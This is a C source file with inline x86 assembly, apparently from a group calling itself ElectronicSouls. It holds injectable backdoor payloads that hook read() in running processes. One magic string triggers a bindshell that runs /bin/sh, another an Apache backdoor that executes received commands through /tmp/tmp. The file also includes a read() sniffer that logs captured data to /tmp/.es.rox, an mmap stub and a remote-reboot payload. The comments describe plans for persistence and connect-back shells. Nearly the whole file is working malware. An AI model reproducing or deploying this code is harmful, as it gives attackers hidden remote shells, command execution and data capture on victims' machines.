/* [ElectronicSouls]
 * various backdoors by Ares and BrainStorm
 *
 * todo:
 *       - find new backd00rs 
 *       - maybe icmp backdoor ;)
 *       - maybe write an init-script to make it resident
 *         grab the pid and re-infect after reboot..
 *       - connect back shell <- in progress
 *       - connect back sniffer <- not yet started
 *       - maybe optimize sizes <- not _that_ neccessary..  
 *       - find a way to implement big backdoors with an 
 *         initial parasite <- solved ! :D
 *       
 */

// bindshell 
asm("backdoor1_BEGIN:");  // start of our payload

int Inject_read(int fd, char *data, int size)
{
   // neet payload by Ares :)

   asm("
	mov $3,%eax
	mov 0x8(%esp),%ebx
        mov 0xc(%esp),%ecx
	mov 0x10(%esp),%edx
	int $128

	mov 0xc(%esp),%edi
	push $0x0a0d7a7a
	push $0x6e773079
	mov %esp,%esi
	push %eax
	mov $8,%ecx
	cld 
	rep cmpsb
	jnz cont1

        mov $0x66,%al
	mov $0x1,%bl
	push %ecx
	mov $0x6,%cl
	push %ecx
	mov $0x1,%cl
	push %ecx
	mov $0x2,%cl
	push %ecx
	lea (%esp),%ecx
	int $0x80
					     
	mov $0x2,%bl
	mov $0x2,%cl
    	xor %ecx,%ecx
	push %ecx
	push %ecx
	push %ecx

	add $0x45,%cl
	push %ecx
	mov $0x2,%cl
	push %ecx
	lea (%esp),%ecx
	mov $0x10,%dl
	push %edx
	push %ecx
        push %eax
	lea (%esp),%ecx
	mov %eax,%edx
	mov $0x66,%al
	int $0x80

	mov $0x1,%bl
	push %ebx
	push %edx
	lea (%esp),%ecx
	xor %eax,%eax
	mov $0x66,%al
	add $0x3,%bl
	int $0x80

	xor %eax,%eax
	push %eax
	push %eax
	push %edx
	lea (%esp),%ecx
	mov $0x5,%bl
	mov $0x66,%al
	int $0x80
	
	xchg %eax,%ebx
	xor %ecx,%ecx
	mov $0x3f,%al
	int $0x80						
	
	inc %ecx
	mov $0x3f,%al
	int $0x80
	   
	inc %ecx
	mov $0x3f,%al
	int $0x80

	xor %ebx,%ebx
	push %ebx
	push $0x68732f6e
	push $0x69622f2f
	mov %esp,%ebx
	lea 0x8(%esp),%edx
	xor %ecx,%ecx
	push %ecx
	push %ebx
	lea (%esp),%ecx
	xor %eax,%eax
	mov $0xb,%al
	int $0x80

cont1:
	pop %eax
       ");

// ares code fu .. nuff said :)

}

asm("backdoor1_END:");

// apache backdoor 
asm("backdoor2_BEGIN:");
int patched_syscall(int fd, char *data, int size)
{
   asm("
	mov $3,%eax
	mov 0x8(%esp),%ebx
        mov 0xc(%esp),%ecx
	mov 0x10(%esp),%edx
	int $128

	mov 0xc(%esp),%edi
	push $0x0a0d7a7a
	push $0x6e773079
	mov %esp,%esi
	push %eax
	mov $8,%ecx
	cld
	rep cmpsb
	jnz end

	mov $0x3f,%eax
	mov $3,%ebx
	xor %ecx,%ecx
	int $128
	mov $0x3f,%eax
	incl %ecx
	int $128
	mov $0x3f,%eax
	incl %ecx
	int $128

loop:
	mov $3,%eax
	mov $0,%ebx
	lea -272(%ebp),%ecx
	mov $0x255,%edx
	int $128
	mov %eax,-12(%ebp)

	push $0x0a0d
	push $0x74697865
	mov %esp,%esi
	leal -272(%ebp),%edi
	mov $6,%ecx
	cld
	rep cmpsb
	jz exit
	
	push $0x0000742f
        push $0x706d742f

	mov $15,%eax
	mov %esp,%ebx
	movl $0755,%ecx
	int $128

	mov $5,%eax
        mov %esp,%ebx
	mov $578,%ecx
	int $128
	mov %eax,-4(%ebp)
	
	push $0x0a68
	push $0x732f6e69
	push $0x622f2123
	
	mov $4,%eax
	mov -4(%ebp),%ebx
	mov %esp,%ecx
	mov $10,%edx
	int $128
	
	mov $4,%eax
	mov -4(%ebp),%ebx
	lea -272(%ebp),%ecx
	mov -12(%ebp),%edx
	int $128
	
	mov $6,%eax
	mov -4(%ebp),%ebx
	int $128
	
	mov $190,%eax
	int $128
	
	test %eax,%eax
	sete %dl
	movzbl %dl,%eax
	test %eax,%eax
	je wait
	
        xor %eax,%eax
        push %eax
        push $0x0000742f
        push $0x706d742f
        mov %esp,%ebx
        leal 0x8(%esp,1),%edx
        push %eax
        push %ebx
        leal (%esp,1),%ecx
        movb $0xb,%al
        int $128
wait:
	mov $7,%eax
	mov $-1,%ebx
	leal -8(%ebp),%ecx
	xor %edx,%edx
        int $128

	jmp loop
exit:
	mov $20,%eax
	int $128
	mov %eax,%ebx

	mov $37,%eax
	mov $2,%ecx
	int $128

end:
	pop %eax
       ");
}
asm("backdoor2_END:");

// read() sniffer 
asm("backdoor3_BEGIN:");
int rd_sniff(int fd, char *data, int size)
{
 asm("
         jmp leet

         initme:
         popl %edi              

         xorl %eax, %eax        
         movb $3, %al           
         movl 8(%esp), %ebx      
         movl 12(%esp), %ecx     
         movl 16(%esp), %edx     
         int $0x80

         movl %eax, %esi        
         movl $5, %eax          
         movl %edi, %ebx        
         movl $0x442, %ecx      
         movl $0x1ff, %edx      
         int $0x80

         movl %eax, %ebx        
         movl $4, %eax     
         movl 12(%esp),%ecx    
         movl %esi, %edx     
         int $0x80

         movl $6, %eax
         int $0x80

         movl %esi, %eax
         jmp neeto

         leet:
         call initme
         .ascii \"/tmp/.es.rox\"
         .byte 0x00

         neeto:
     ");
}

asm("backdoor3_END:");

asm("map:");
int rb(int fd, char *data, int size)
{
    asm("
    mov $3,%eax
    mov 0x8(%esp),%ebx
    mov 0xc(%esp),%ecx
    mov 0x10(%esp),%edx
    int $128
    
    xorl %eax,%eax
    push %eax
    pushl $-1
    push $0x21
    pushl $3
    push $0x55          # mmap() allocate 1000 bytes by default, so if you
		        # need more then calculate new size.
    pushl %eax
    movl %esp,%ebx
    movb $45,%al
    addl $45,%eax
    int $128
    ");
}										
asm("map_END:");

asm("reboot_BEGIN:");

int boot(int fd, char *data, int size)
{
asm("
      mov $3,%eax
      mov 0x8(%esp),%ebx
      mov 0xc(%esp),%ecx
      mov 0x10(%esp),%edx
      int $128

      mov 0xc(%esp),%edi
      push $0x0a0d7a7a
      push $0x6e773079
      mov %esp,%esi
      push %eax
      mov $8,%ecx
      cld
      rep cmpsb
      jnz bye
                               # this is kinda stupid heh
                               # annoy ppl remotely :P 
      pusha                    # push all registers
      movl $88, %eax           # __NR_reboot
      movl $0xfee1dead, %ebx   # LINUX_REBOOT_MAGIC1
      movl $672274793, %ecx    # LINUX_REBOOT_MAGIC2
      movl $0x1234567, %edx    # LINUX_REBOOT_CMD_RESTART
#     movl $0x4321fedc, %edx   # LINUX_REBOOT_CMD_POWER_OFF
      int $0x80                # p00f!

      movl $1, %eax            # __NR_exit
      movl $31337, %ebx        # yes! it is..
      int $0x80                # bye bye
      popa                     # pop all registers

      bye:
      pop %eax
    ");
}
asm("reboot_END:");

// thats it for now!
